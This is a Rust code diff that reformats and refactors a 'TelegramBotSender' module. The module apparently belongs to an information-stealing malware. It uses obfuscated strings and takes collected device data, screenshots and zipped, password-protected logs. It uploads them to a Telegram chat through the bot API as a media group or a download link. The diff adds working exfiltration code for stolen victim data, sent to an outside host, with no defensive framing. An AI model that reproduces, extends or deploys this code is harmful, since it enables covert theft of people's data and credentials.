@@ -1,4 +1,4 @@
-use crate::{LogFile, LogSender, SendError};
+use crate::{LogContent, LogFile, LogSender, SendError};
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
@@ -7,7 +7,10 @@ use collector::{Collector, Device, DisplayCollector};
 use core::fmt::{Display, Error, Formatter};
 use derive_new::new;
 use obfstr::obfstr as s;
-use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
+use requests::{
+    write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request,
+    RequestBuilder,
+};
 use utils::format_size;
 
 const TELEGRAM_MAX_FILE_SIZE: usize = 2 * 1024 * 1024 * 1024;
@@ -24,25 +27,27 @@ const TELEGRAM_MAX_FILE_SIZE: usize = 2 * 1024 * 1024 * 1024;
 #[derive(new, Clone)]
 pub struct TelegramBotSender {
     chat_id: Arc<str>,
-    token: Arc<str>
+    token: Arc<str>,
 }
 
-fn generate_caption<P, C>(log: &LogFile, password: Option<P>, collector: &C) -> (String, Option<String>)
+fn generate_caption<P, C>(
+    log_content: &LogContent,
+    password: Option<P>,
+    collector: &C,
+) -> (String, Option<String>)
 where
     P: AsRef<str>,
-    C: Collector
+    C: Collector,
 {
     let caption = DisplayCollector(collector).to_string();
 
-    let link = match log {
-        LogFile::ExternalLink((link, size)) => Some(
-            format!(
-                r#"<a href="{}">Download [{}]</a>"#,
-                link,
-                format_size(*size as _)
-            )
-        ),
-        LogFile::ZipArchive(_) => None
+    let link = match log_content {
+        LogContent::ExternalLink((link, size)) => Some(format!(
+            r#"<a href="{}">Download [{}]</a>"#,
+            link,
+            format_size(*size as _)
+        )),
+        _ => None,
     };
 
     let password = password.map(|password| {
@@ -51,9 +56,17 @@ where
     });
 
     let mut parts = vec![];
-    if let Some(l) = link { parts.push(l); }
-    if let Some(p) = password { parts.push(p); }
-    let thumbnail = if parts.is_empty() { None } else { Some(parts.join(" ")) };
+    if let Some(l) = link {
+        parts.push(l);
+    }
+    if let Some(p) = password {
+        parts.push(p);
+    }
+    let thumbnail = if parts.is_empty() {
+        None
+    } else {
+        Some(parts.join(" "))
+    };
 
     (caption, thumbnail)
 }
@@ -71,7 +84,11 @@ pub struct MediaItem {
 }
 
 impl MediaGroup {
-    pub fn add_document(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
+    pub fn add_document(
+        &mut self,
+        media_name: impl Into<String>,
+        caption: Option<String>,
+    ) -> &mut Self {
         self.items.push(MediaItem {
             media_type: s!("document").to_string(),
             media: format!("attach://{}", media_name.into()),
@@ -81,7 +98,11 @@ impl MediaGroup {
         self
     }
 
-    pub fn add_photo(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
+    pub fn add_photo(
+        &mut self,
+        media_name: impl Into<String>,
+        caption: Option<String>,
+    ) -> &mut Self {
         self.items.push(MediaItem {
             media_type: s!("photo").to_string(),
             media: format!("attach://{}", media_name.into()),
@@ -94,7 +115,11 @@ impl MediaGroup {
 
 impl Display for MediaItem {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
-        write!(f, r#"{{"type": "{}","media": "{}""#, self.media_type, self.media)?;
+        write!(
+            f,
+            r#"{{"type": "{}","media": "{}""#,
+            self.media_type, self.media
+        )?;
 
         if let Some(caption) = &self.caption {
             let escaped = caption.replace('\\', "\\\\").replace('"', "\\\"");
@@ -111,7 +136,8 @@ impl Display for MediaItem {
 
 impl Display for MediaGroup {
     fn fmt(&self, f: &mut Formatter<'_>) -> Result<(), Error> {
-        let json = self.items
+        let json = self
+            .items
             .iter()
             .map(ToString::to_string)
             .collect::<Vec<_>>()
@@ -122,7 +148,14 @@ impl Display for MediaGroup {
 }
 
 impl TelegramBotSender {
-    fn send_as_file(&self, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
+    fn send_as_file(
+        &self,
+        log_name: &str,
+        archive: Vec<u8>,
+        screenshot: Option<Vec<u8>>,
+        caption: String,
+        thumbnail: Option<String>,
+    ) -> Result<(), SendError> {
         let mut builder = MultipartBuilder::new("----BoundaryMediaGroup");
 
         write_text_field!(builder, "chat_id" => &self.chat_id);
@@ -133,7 +166,13 @@ impl TelegramBotSender {
             media_group.add_document("screenshot", Some(caption));
             media_group.add_document("logfile", thumbnail);
 
-            write_file_field!(builder, "screenshot", "screenshot.png", "image/png", screenshot_bytes);
+            write_file_field!(
+                builder,
+                "screenshot",
+                "screenshot.png",
+                "image/png",
+                screenshot_bytes
+            );
         } else {
             let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);
             media_group.add_document("logfile", Some(combined_caption));
@@ -142,14 +181,19 @@ impl TelegramBotSender {
         let media_json = media_group.to_string();
 
         write_text_field!(builder, "media" => &media_json);
-        write_file_field!(builder, "logfile", "log.zip", "application/zip", &archive);
+        write_file_field!(builder, "logfile", log_name => "application/zip", &archive);
 
         self.send_request(s!("sendMediaGroup"), builder)?;
 
         Ok(())
     }
 
-    fn send_as_link(&self, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
+    fn send_as_link(
+        &self,
+        screenshot: Option<Vec<u8>>,
+        caption: String,
+        thumbnail: Option<String>,
+    ) -> Result<(), SendError> {
         let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);
 
         match screenshot {
@@ -158,7 +202,13 @@ impl TelegramBotSender {
                 write_text_field!(builder, "chat_id" => &self.chat_id);
                 write_text_field!(builder, "caption" => &combined_caption);
                 write_text_field!(builder, "parse_mode", "HTML");
-                write_file_field!(builder, "photo", "screenshot.png", "image/png", &photo_bytes);
+                write_file_field!(
+                    builder,
+                    "photo",
+                    "screenshot.png",
+                    "image/png",
+                    &photo_bytes
+                );
 
                 self.send_request(s!("sendPhoto"), builder)?
             }
@@ -179,12 +229,16 @@ impl TelegramBotSender {
         let content_type = body.content_type();
         let body = body.finish();
 
-        Request::post(format!("https://api.telegram.org/bot{}/{}", self.token, method))
-            .header(s!("Content-Type"), &content_type)
-            .body(body)
-            .build()
-            .send()
-            .ok().ok_or(SendError::Network)?;
+        Request::post(format!(
+            "https://api.telegram.org/bot{}/{}",
+            self.token, method
+        ))
+        .header(s!("Content-Type"), &content_type)
+        .body(body)
+        .build()
+        .send()
+        .ok()
+        .ok_or(SendError::Network)?;
 
         Ok(())
     }
@@ -198,31 +252,36 @@ fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> St
 }
 
 impl LogSender for TelegramBotSender {
-    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(
+        &self,
+        log_file: LogFile,
+        password: Option<P>,
+        collector: &C,
+    ) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
-        C: Collector
+        C: Collector,
     {
-        if let LogFile::ZipArchive(ref archive) = log_file {
+        if let LogFile::ZipArchive(archive) = &log_file.content {
             if archive.len() >= TELEGRAM_MAX_FILE_SIZE {
                 return Err(SendError::LogFileTooBig);
             }
         }
 
-        let (caption, thumbnail) = generate_caption(&log_file, password, collector);
+        let (caption, thumbnail) = generate_caption(&log_file.content, password, collector);
+        let LogFile { name, content } = log_file;
 
-        match log_file {
-            LogFile::ZipArchive(archive) => self.send_as_file(
+        match content {
+            LogContent::ZipArchive(archive) => self.send_as_file(
+                &name,
                 archive,
                 collector.get_device().get_screenshot(),
                 caption,
-                thumbnail
+                thumbnail,
             ),
-            LogFile::ExternalLink(_) => self.send_as_link(
-                collector.get_device().get_screenshot(),
-                caption,
-                thumbnail
-            )
+            LogContent::ExternalLink(_) => {
+                self.send_as_link(collector.get_device().get_screenshot(), caption, thumbnail)
+            }
         }
     }
 }
